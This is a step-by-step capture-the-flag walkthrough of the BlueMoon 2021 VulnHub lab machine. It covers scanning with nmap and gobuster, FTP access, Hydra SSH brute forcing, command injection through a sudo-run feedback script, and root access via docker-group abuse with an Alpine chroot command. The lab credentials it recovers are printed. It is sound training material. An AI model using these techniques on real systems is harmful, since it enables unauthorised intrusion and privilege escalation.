# :closed_lock_with_key: Lab 2 - Bluemoon-2021 VulnHub Walkthrough

## Table of Contents

- [Lab Setup](#desktop_computer-lab-setup)
- [Step 1 - Reconnaissance](#mag-step-1---reconnaissance)
- [Step 2 - Find Your IP](#globe_with_meridians-step-2---find-your-ip)
- [Step 3 - Discover Target Machine](#satellite-step-3---discover-target-machine)
- [Step 4 - Port Scanning](#door-step-4---port-scanning)
- [Step 5 - Web Enumeration](#earth_africa-step-5---web-enumeration)
- [Step 6 - Hidden Directory Discovery](#card_index_dividers-step-6---explore-hidden-directory)
- [Step 7 - FTP Access](#file_folder-step-7--login-via-ftp)
- [Step 8 - SSH Brute Force](#old_key-step-8--ssh-brute-force)
- [Step 9 - Initial Access](#computer-step-9--ssh-login)
- [Step 10 - Horizontal Privilege Escalation](#arrow_up-step-10--horizontal-privilege-escalation-to-jerry)
- [Step 11 - Root Privilege Escalation](#whale-step-11--vertical-privilege-escalation)
- [Conclusion](#books-conclusion)

A step-by-step penetration testing walkthrough for the **BlueMoon 2021 VulnHub machine**.

---

## :desktop_computer: Lab Setup

- Attacker Machine: Kali Linux
- Target Machine: BlueMoon
- Network: Host-Only Adapter
- Tools Used:
  - nmap
  - netdiscover
  - gobuster
  - hydra
  - ftp
  - ssh

[Download from VulnHub](https://www.vulnhub.com/entry/bluemoon-2021,679/)  
Import and start it in **VirtualBox**  
![alt text](image Bluemoon/Bluemoon.png)

---

## :mag: Step 1 - Reconnaissance
Locating the target IP within the local network range.
```bash
netdiscover
```
![alt text](

---

## :globe_with_meridians: Step 2 - Find Your IP
Check the IP address of the Kali Linux attacker machine.  
```bash
ifconfig
```
![alt text](
> Attacker machine's IP address (`192.168.56.108`)

---

## :satellite: Step 3 - Discover Target Machine

Nmap is used to identify open ports and running services on the target machine.  

```bash
nmap -sn 192.168.56.0/24
```
![alt text](
> Identify the BlueMoon machine IP (`192.168.56.109`)

---

## :door: Step 4 - Port Scanning

Perform a full port scan to identify open services.  

```bash
nmap -sV -p- 192.168.56.109
```
![alt text](

**Open ports found:**
| Port | State | Service | Version                                      |
|------|-------|---------|----------------------------------------------|
| 21   | Open  | FTP     |vsftpd 3.0.3                                  |
| 22   | Open  | SSH     |OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)|
| 80   | Open  | HTTP    |Apache httpd 2.4.38 ((Debian))                |

---

## :earth_africa: Step 5 - Web Enumeration

Access the web server through the browser `http://192.168.56.109`.  
No useful information is visible on the main page.  
![alt text](

Gobuster is used to perform directory brute-forcing on the web server to discover hidden directories that are not visible on the main webpage.  

```bash
gobuster dir -u http://192.168.56.109 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t10 --timeout 30s
```
The ``` -t10``` option increases the scanning speed by allowing multiple requests at the same time.  
The ```--timeout 30s``` option prevents the scan from waiting too long for slow server responses.

![alt text](
> Discovered: `/hidden_text`

---

## :card_index_dividers: Step 6 - Explore Hidden Directory

Navigate to the discovered directory `http://192.168.56.109/hidden_text`

![alt text](
- Click the **"Thank you…"** link
- A **QR code image** will appear — download it

![alt text](

Decode the QR code at [https://zxing.org/w/decode.jspx](https://zxing.org/w/decode.jspx)
![alt text](

**Credentials found:**
```
USER: userftp
PASSWORD: ftpp@ssword
```

---
## :file_folder: Step 7 — Login via FTP

Login using the discovered FTP credentials.  

```bash
ftp 192.168.56.109
```
![alt text](

List down the files, and there are two files called information.txt and p_lists.txt.

```bash
ls
```

Download those files to host machine using get command.

```bash
get information.txt
get p_lists.txt
```
![alt text](

Read the files:

```bash
cat information.txt
```
![alt text](

```bash
cat p_lists.txt
```
![alt text](

> `information.txt` reveals a username: **robin**  
> `p_lists.txt` is a password list

---

## :old_key: Step 8 — SSH Brute Force

Using Hydra to brute force SSH.

```bash
hydra -l robin -P p_lists.txt ssh://192.168.56.109
```
![alt text](

**Credentials Discovered:**
```
Login: robin
Password: k4rv3ndh4nh4ck3r
```

---
## :computer: Step 9 — SSH Login

```bash
ssh robin@192.168.56.109
```
![alt text](
```bash
ls -l
cat user1.txt
```
![alt text](
> :triangular_flag_on_post: **Flag 1 obtained!**

---
## :arrow_up: Step 10 — Horizontal Privilege Escalation to Jerry

Check sudo privileges.  

```bash
sudo -l
```
![alt text](

```bash
cd project
ls
cat feedback.sh
```

![alt text](

> A script `feedback.sh` can be executed as **jerry**

Execute the script.  

```bash
sudo -u jerry /home/robin/project/feedback.sh
```

![alt text](

- When prompted for **name**, type: `jerry`
- When prompted for **feedback**, type: `/bin/bash`

```bash
whoami
pwd
ls
cd /home/jerry
ls
cat user2.txt
```

![alt text](

> :triangular_flag_on_post: **Flag 2 obtained!**

---

## :whale: Step 11 — Vertical Privilege Escalation

Upgrade to interactive shell.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

![alt text](

Check group membership.

```bash
id
```

![alt text](

> User **jerry** is in the **docker** group.
> Users in the docker group can run containers with root privileges.

List docker images.

```bash
docker image ls
```

![alt text](

GTFOBins consists of commands we can use with docker in order to escalate our privileges to root. [GTFOBins Docker](https://gtfobins.github.io/gtfobins/docker/)  
So, we can exploit Alpine image and mount the root directory in a docker container which will prompt us the root shell.

Exploit the docker container to mount the root filesystem.

```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

![alt text](

Verify root access and retrieve the root flag.

```bash
id
cd /root
ls
cat root.txt
```

![alt text](

> :triangular_flag_on_post: **Root Access Achieved – Machine Successfully Compromised!**

# :books: Conclusion

This VulnHub machine demonstrates several important penetration testing techniques:

- Network discovery using **netdiscover**
- Port scanning using **nmap**
- Web directory enumeration using **gobuster**
- Credential discovery through **QR code decoding**
- SSH brute force using **hydra**
- Horizontal privilege escalation
- Root privilege escalation via **docker group abuse**

Through these steps, full root access to the machine was achieved.
